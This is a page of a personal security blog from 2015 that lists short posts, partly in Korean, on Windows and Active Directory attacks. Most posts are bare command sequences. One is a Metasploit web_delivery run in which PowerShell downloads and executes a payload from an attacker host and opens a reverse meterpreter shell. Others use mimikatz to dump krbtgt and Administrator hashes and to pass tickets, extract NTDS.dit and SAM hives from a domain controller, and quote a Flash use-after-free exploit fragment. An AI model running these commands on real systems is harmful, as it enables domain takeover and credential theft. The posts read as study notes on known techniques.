
<!DOCTYPE html>
<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
<head>
  <meta charset="utf-8">
  <title>KC's blog</title>
  <meta name="author" content="KC">

  
  <meta name="description" content="mimikatz @ passwords#14
Mimikatz 2.0 - Golden Ticket Walkthrough
Abusing Microsoft Kerberos by Alva DUCKWALL &amp; Benjamin DELPY
Kerberos tickets &hellip;">
  

  <!-- http://t.co/dKP3o1e -->
  <meta name="HandheldFriendly" content="True">
  <meta name="MobileOptimized" content="320">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  
  <link rel="canonical" href="http://zomo.heroku.com/posts/5/">
  <link href="/favicon.png" rel="icon">
  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
  <link href="/atom.xml" rel="alternate" title="KC's blog" type="application/atom+xml">
  <script src="/javascripts/modernizr-2.0.js"></script>
  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
  <script src="/javascripts/octopress.js" type="text/javascript"></script>
  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">

  

</head>

<body   >
  <header role="banner"><hgroup>
  <h1><a href="/">KC's blog</a></h1>
  
    <h2>A blogging framework for hackers.</h2>
  
</hgroup>

</header>
  <nav role="navigation"><ul class="subscription" data-subscription="rss">
  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
  
</ul>
  
<form action="https://www.google.com/search" method="get">
  <fieldset role="search">
    <input type="hidden" name="sitesearch" value="zomo.heroku.com">
    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
  </fieldset>
</form>
  
<ul class="main-navigation">
  <li><a href="/">Blog</a></li>
  <li><a href="/blog/archives">Archives</a></li>
</ul>

</nav>
  <div id="main">
    <div id="content">
      <div class="blog-index">
  
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/07/10/metasploit-web-delivery/">Metasploit: Web_delivery</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-07-10T09:33:08+09:00'><span class='date'><span class='date-month'>Jul</span> <span class='date-day'>10</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>9:33 am</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><ul>
<li><a href="http://www.slideshare.net/gentilkiwi/mimikatz-how-to-push-microsoft-to-change-some-little-stuff">mimikatz @ passwords#14</a></li>
<li><a href="http://www.beneaththewaves.net/Projects/Mimikatz_20_-_Golden_Ticket_Walkthrough.html">Mimikatz 2.0 - Golden Ticket Walkthrough</a></li>
<li><a href="https://www.blackhat.com/docs/us-14/materials/us-14-Duckwall-Abusing-Microsoft-Kerberos-Sorry-You-Guys-Don't-Get-It.pdf">Abusing Microsoft Kerberos by Alva DUCKWALL &amp; Benjamin DELPY</a></li>
<li><a href="http://www.ietf.org/rfc/rfc4120.txt">Kerberos tickets</a></li>
<li><a href="http://www.ietf.org/rfc/rfc4757.txt">RFC4757</a></li>
<li><a href="http://msdn.microsoft.com/library/cc237917.aspx">Microsoft Specific PAC</a></li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>exploit(web_delivery) &gt; set TARGET 2
</span><span class='line'>exploit(web_delivery) &gt; set PAYLOAD windows/meterpreter/reverse_tcp
</span><span class='line'>exploit(web_delivery) &gt; set LHOST 172.16.3.76
</span><span class='line'>exploit(web_delivery) &gt; set LPORT 8686
</span><span class='line'>exploit(web_delivery) &gt; run
</span><span class='line'>[*] Exploit running as background job.
</span><span class='line'>
</span><span class='line'>[*] [...] Started reverse handler on 172.16.3.76:8686
</span><span class='line'>[*] [...] Using URL: http://0.0.0.0:8080/moKqrqIYh0
</span><span class='line'>...
</span><span class='line'>
</span><span class='line'>$ winexe -k DOMAIN //dc01 "powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring('http://172.16.3.76:8080/moKqrqIYh0'))"
</span><span class='line'>
</span><span class='line'>...
</span><span class='line'>meterpreter &gt; getuid
</span><span class='line'>meterpreter &gt; getsystem
</span><span class='line'>meterpreter &gt; getprivs
</span><span class='line'>meterpreter &gt; portfwd ...
</span><span class='line'>
</span><span class='line'>$ python forgeTGT.py ...
</span><span class='line'>$ wine mimikatz.exe "kerberos::clist TGT_... /export" exit
</span><span class='line'>
</span><span class='line'>meterpreter &gt; load kiwi
</span><span class='line'>meterpreter &gt; kerberos_ticket_use /root/git/....DOAMIN.kirbi
</span><span class='line'>meterpreter &gt; shell
</span><span class='line'>
</span><span class='line'>c:\&gt; sc \\dc01\ create psh binPath="cmd.exe /c powershell -nop -w hidden -c IEK ((new-object net.webclient).downloadstring('172.16.3.76:8080/moKqrqIYh0'))"
</span><span class='line'>c:\&gt; sc \\dc01\ start psh
</span><span class='line'>c:\&gt; sc \\dc01\ delete psh
</span><span class='line'>c:\&gt; exit
</span><span class='line'>
</span><span class='line'>meterpreter &gt; background
</span><span class='line'>meterpreter &gt; sessions -i ...
</span><span class='line'>meterpreter &gt; run post/windows/gather/hashdump
</span><span class='line'>meterpreter &gt; run post/windows/gather/credentials/credential_collector</span></code></pre></td></tr></table></div></figure>


<p>mimikatz</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mimikatz # sekurlsa::logonpasswords
</span><span class='line'>mimikatz # sekurlsa::ekeys
</span><span class='line'>mimikatz # lsadump::lsa /inject /name:krbtgt
</span><span class='line'>mimikatz # lsadump::lsa /inject /name:Administrator
</span><span class='line'>mimikatz # sekurlsa::pth /user:Administrator /domain:babo.local /ntlm:cc36...
</span><span class='line'>mimikatz # kerberos::list /export
</span><span class='line'>mimikatz # kerberos::ptt ticket.kirbi
</span><span class='line'>mimikatz # sekurlsa::tickets /export</span></code></pre></td></tr></table></div></figure>


<ul>
<li>Kerberos::Overpass-the-hash</li>
<li><a href="http://msdn.microsoft.com/library/windows/desktop/aa378099.aspx">Kerberos::Pass-the-ticket</a></li>
</ul>

</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/07/10/red-vs-blue-modern-active-directory-attacks/">Red vs. Blue: Modern Active Directory Attacks</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-07-10T09:08:51+09:00'><span class='date'><span class='date-month'>Jul</span> <span class='date-day'>10</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>9:08 am</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>From shakacon.org</p>

<p>Name: Sean Metcalf</p>

<p>Synopsis: While Kerberos &ldquo;Golden Tickets&rdquo; and &ldquo;Silver Tickets&rdquo; received a lot of press in the second half of 2014, there hasn&rsquo;t been much detail provided on how exactly they work, why they are successful, and how to mitigate them (other than: &ldquo;don&rsquo;t get pwned&rdquo;). Golden Tickets are the ultimate method for persistent, forever AD admin rights to a network since they are valid Kerberos tickets and can&rsquo;t be detected, right?</p>

<p>This talk covers the latest AD attack vectors and describes how to detect Golden Ticket usage. Provided are key indicators that can detect Kerberos attacks on your network, including Golden tickets, Silver tickets &amp; MS14-068 exploitation, as well as methods to identify, mitigate, and prevent common Active Directory attack vectors. When forged Kerberos tickets are used in AD, there are some interesting artifacts that can be identified. Yes, despite what you may have read on the internet, there are ways to detect Golden &amp; Silver Ticket usage!</p>

<p>Some of the topics covered:</p>

<ul>
<li>How attackers go fro mzero to (Domain) Admin</li>
<li>MS14-068: the vulnerability, the exploit, and the danger</li>
<li>&ldquo;SPN Scanning&rdquo; with PowerShell to identify potential targets without network scans (SQL, Exchange, FIM, webservers, etc)</li>
<li>Exploiting weak service account passwords as a regular AD user</li>
<li>Mimikatz, the attacker&rsquo;s multi-tool</li>
<li>Using Silver Tickets for stealthy persistence that won&rsquo;t be detected (until now)</li>
<li>Identifying forged Kerberos tickets (Golden &amp; Silver Tickets) on your network</li>
<li>Detecting offensive PowerShell tools like Invoke-Mimikatz</li>
<li>Active Directory attack mitigation</li>
</ul>

</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/07/09/hackingteams-flash-0day/">HackingTeam's Flash 0day</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-07-09T15:53:27+09:00'><span class='date'><span class='date-month'>Jul</span> <span class='date-day'>9</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>3:53 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>static var _ba:ByteArray;
</span><span class='line'>static var _va:Array;
</span><span class='line'>
</span><span class='line'>var a = new Array(90);
</span><span class='line'>for (var i: int; i &lt; 90; i+= 3) {
</span><span class='line'>    a[i] = new Class2(i);
</span><span class='line'>    a[i+1] = new ByteArray();
</span><span class='line'>    a[i+1].length = 0xfa0; // 4000
</span><span class='line'>    a[i+2] = new Class2(i+2)
</span><span class='line'>}
</span><span class='line'>
</span><span class='line'>a[0]: Class2(0)
</span><span class='line'>a[1]: ByteArray()
</span><span class='line'>a[2]: Class2(2)
</span><span class='line'>a[3]: Class2(3)
</span><span class='line'>a[4]: ByteArray()
</span><span class='line'>a[5]: Class2(5)
</span><span class='line'>a[6]: Class2(6)
</span><span class='line'>a[7]: ByteArray()
</span><span class='line'>...
</span><span class='line'>a[85]: ByteArray()
</span><span class='line'>a[86]: Class2(86)
</span><span class='line'>a[87]: Class2(87)
</span><span class='line'>a[88]: ByteArray()
</span><span class='line'>a[89]: Class2(89)
</span><span class='line'>
</span><span class='line'>prototype.valueOf =  function() {
</span><span class='line'>    _va = new Array(5)
</span><span class='line'>    _gc.push(_va)
</span><span class='line'>    _ba.length = 0x1100
</span><span class='line'>    for(var i:int;i&lt;_va.length;i++)
</span><span class='line'>        _va[i] = new Vector.&lt;uint&gt;(0x3f0)
</span><span class='line'>    return 0x40;
</span><span class='line'>}
</span><span class='line'>
</span><span class='line'>var v:Vector.&lt;uint&gt;;
</span><span class='line'>for (i=85; i&gt;=0; i-=3) {
</span><span class='line'>    _ba = a[i];
</span><span class='line'>    _ba[3] = new MyClass(); // call MyClass()'s prototype.valueOf
</span><span class='line'>    if (_ba[3]!=0x0) throw new Error("can't cause UaF");</span></code></pre></td></tr></table></div></figure>


<p>valueOf() 의 ret 값이 vector length 에 씌여지기때문에,
_ba[3] 은 여전히 0 이여야하고, 0x40 은 vector 에 씌여진다.</p>

<p>UaF 가 성공했으면, _va[i] 의 4 번째 바이트가 0x40 으로 씌여진다.
이제 length 가 굉장히 길어진 Vector 가 탄생했다.
이 Vector 로 메모리의 허가받지 않은 영역을 read &amp; write 할 수 있다.</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/07/07/easy-local-windows-kernel-exploitation/">Easy Local Windows Kernel Exploitation</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-07-07T17:04:01+09:00'><span class='date'><span class='date-month'>Jul</span> <span class='date-day'>7</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>5:04 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p><a href="https://media.blackhat.com/bh-us-12/Briefings/Cerrudo/BH_US_12_Cerrudo_Windows_Kernel_WP.pdf">Easy Local Windows Kernel Exploitation</a></p>

<h4>Nulling out ACLs</h4>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>kd&gt; dt nt!_OBJECT_HEADER
</span><span class='line'>...
</span><span class='line'>+0x014 SecurityDescriptor : Ptr32 Void 
</span><span class='line'>+0x018 Body : _QUAD</span></code></pre></td></tr></table></div></figure>


<ol>
<li>NtQuerySystemInformation() 으로 target object 의 kernel 주소를 얻어낸다.</li>
<li>address - 4 (x86) or address - 8 (x64) 에다가 NULL 을 쓴다. (SecurityDescriptor 를 밀어버린다)</li>
<li>LSASS process 에 접근해서 hash 를 덤프한다.</li>
</ol>


<h4>SEP_TOKEN_PRIVILEGES 조작</h4>

<h4>EPROCESS 의 Token 구조체 조작</h4>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/06/30/re-packing-android-apk-files/">Re-packing Android APK Files</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-06-30T11:23:09+09:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>30</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>11:23 am</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><h4>Packing &amp; Unpacking</h4>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>unzip On*.apk classes.dex
</span><span class='line'>java -mx512m -jar ./baksmali-2.0.3.jar classes.dex
</span><span class='line'>keytool -genkey -v -keystore my-release-key.keystore -alias babo -keyalg RSA -keysize 2048 -validity 10000
</span><span class='line'>java -mx512m -jar ./smali-2.0.3.jar out -o classes.dex
</span><span class='line'>zip -d On*.apk classes.dex
</span><span class='line'>zip -d On*.apk "META-INF/*"
</span><span class='line'>zip On*.apk classes.dex
</span><span class='line'>jarsigner -storepass &lt;password&gt; -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore On*.apk babo
</span><span class='line'>adb shell pm uninstall com.xxx.yyy.zzz
</span><span class='line'>adb install On*.apk</span></code></pre></td></tr></table></div></figure>


<h4>aapt</h4>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>aapt dump WHAT file.apk [asset [asset ...]]
</span><span class='line'>  strings
</span><span class='line'>  badging
</span><span class='line'>  permissions
</span><span class='line'>  resources
</span><span class='line'>  configurations
</span><span class='line'>  xmltree
</span><span class='line'>  xmlstrings</span></code></pre></td></tr></table></div></figure>

</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/06/25/safely-dumping-hashes-from-live-domain-controllers/">Safely Dumping Hashes From Live Domain Controllers</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-06-25T23:42:42+09:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>25</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>11:42 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><ul>
<li><a href="http://securityweekly.com/2011/11/02/safely-dumping-hashes-from-liv/">Safely Dumping Hashes from Live Domain Controllers</a></li>
<li><a href="https://www.trustwave.com/Resources/SpiderLabs-Blog/Tutorial-for-NTDS-goodness-%28VSSADMIN,-WMIS,-NTDS-dit,-SYSTEM%29/">Tutorial for NTDS goodness</a></li>
<li><a href="http://blogs.msdn.com/b/adioltean/archive/2005/01/05/346793.aspx">Script recipe of the week: how to copy an opened file</a></li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>C:\&gt; reg.exe query hklm\system\currentcontrolset\services\ntds\parameters
</span><span class='line'>
</span><span class='line'>C:\&gt; vssadmin create shadow /for=c:
</span><span class='line'>
</span><span class='line'>C:\&gt; copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\ntds\ntds.git d:
</span><span class='line'>C:\&gt; copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\system32\config\SYSTEM d:
</span><span class='line'>C:\&gt; copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy[X]\windows\system32\config\SAM d:
</span><span class='line'>
</span><span class='line'>C:\&gt; vssadmin delete shadows /for=c: /quiet
</span><span class='line'>
</span><span class='line'>C:\&gt; reg.exe save hklm\sam c:\temp\sam.sav
</span><span class='line'>C:\&gt; reg.exe save hklm\security c:\temp\security.sav
</span><span class='line'>C:\&gt; reg.exe save hklm\system c:\temp\system.sav
</span><span class='line'>
</span><span class='line'>$ python sd.py -sam ... -security ... -system ... LOCAL</span></code></pre></td></tr></table></div></figure>


<ul>
<li><a href="http://www.sans.org/reading-room/whitepapers/testing/pass-the-hash-attacks-tools-mitigation-33283">Pass-the-hash attacks: Tools and Mitigation</a></li>
</ul>

</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/06/20/understanding-type-confusion-vulnerabilities-cve-2015-0336/">Understanding Type Confusion Vulnerabilities: CVE-2015-0336</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-06-20T14:08:38+09:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>20</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>2:08 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>TechNet blogs 에 올라온 글을 정리해본다.</p>

<p><a href="http://blogs.technet.com/b/mmpc/archive/2015/06/18/understanding-type-confusion-vulnerabilities-cve-2015-0336.aspx">Understanding type confusion vulnerabilities: CVE-2015-0336</a></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>class Trigger
</span><span class='line'>{
</span><span class='line'>    function Trigger()
</span><span class='line'>    {
</span><span class='line'>        var _loc2_ = _global.ASnative(2100,438181888);
</span><span class='line'>        var _loc3_ = new Object();
</span><span class='line'>        _loc2_.__proto__ = _loc3_;
</span><span class='line'>        _global.ASnative(2100,200)(_loc3_);
</span><span class='line'>        _global.ASnative(2100,8).apply(_loc2_,[1]);
</span><span class='line'>        var _loc4_ = new LocalConnection();
</span><span class='line'>        _loc4_.send("toAS3","trig_loaded");
</span><span class='line'>    }
</span><span class='line'>    static function main(mc)
</span><span class='line'>    {
</span><span class='line'>        Trigger.app = new Trigger();
</span><span class='line'>    }
</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>

</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/06/18/the-birth-of-a-complete-ie11-exploit-under-the-new-exploit-mitigations/">The Birth of a Complete IE11 Exploit Under the New Exploit Mitigations</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-06-18T21:44:20+09:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>18</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>9:44 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><p>Yuki Chen 이 발표한 The Birth of a Complete IE11 Exploit Under the New Exploit Mitigations 를 읽고 요약해본다.</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/06/17/mimikatz/">Mimikatz</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-06-17T16:34:53+09:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>17</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>4:34 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mimikatz # lsadump::lsa /name:krbtgt /inject
</span><span class='line'>Domain: KRBTGT / S-1-5-21-41...
</span><span class='line'>
</span><span class='line'>...
</span><span class='line'> * Primary
</span><span class='line'>    LM   :
</span><span class='line'>    NTLM : 02ca...</span></code></pre></td></tr></table></div></figure>

</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2015/06/16/fuzzing-drm-protected-pdf-files/">Fuzzing DRM-protected PDF Files</a></h1>
    
    
      <p class="meta">
        




<time class='entry-date' datetime='2015-06-16T14:58:01+09:00'><span class='date'><span class='date-month'>Jun</span> <span class='date-day'>16</span><span class='date-suffix'>th</span>, <span class='date-year'>2015</span></span> <span class='time'>2:58 pm</span></time>
        
      </p>
    
  </header>


  <div class="entry-content"><ul>
<li><a href="https://www.blackhat.com/presentations/bh-jp-05/bh-jp-05-sutton-greene.pdf">The Art of File Format Fuzzing</a></li>
</ul>

</div>
  
  


    </article>
  
  <div class="pagination">
    
      <a class="prev" href="/posts/6">&larr; Older</a>
    
    <a href="/blog/archives">Blog Archives</a>
    
    <a class="next" href="/posts/4">Newer &rarr;</a>
    
  </div>
</div>
<aside class="sidebar">
  
    <section>
  <h1>Recent Posts</h1>
  <ul id="recent_posts">
    
      <li class="post">
        <a href="/blog/2016/03/25/bleichenbacher/">Bleichenbacher</a>
      </li>
    
      <li class="post">
        <a href="/blog/2016/03/03/the-drown-attack/">The DROWN Attack</a>
      </li>
    
      <li class="post">
        <a href="/blog/2016/02/25/mnist-for-ml-beginners/">MNIST for ML Beginners</a>
      </li>
    
      <li class="post">
        <a href="/blog/2016/02/16/plaid-ctf-2015-one-null-byte/">Plaid CTF 2015 - One NULL Byte</a>
      </li>
    
      <li class="post">
        <a href="/blog/2016/02/12/understanding-the-heap-and-exploiting-heap-overflows/">Understanding the Heap &amp; Exploiting Heap Overflows</a>
      </li>
    
  </ul>
</section>





  
</aside>

    </div>
  </div>
  <footer role="contentinfo"><p>
  Copyright &copy; 2016 - KC -
  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
</p>

</footer>
  







  <script type="text/javascript">
    (function(){
      var twitterWidgets = document.createElement('script');
      twitterWidgets.type = 'text/javascript';
      twitterWidgets.async = true;
      twitterWidgets.src = '//platform.twitter.com/widgets.js';
      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
    })();
  </script>





</body>
</html>
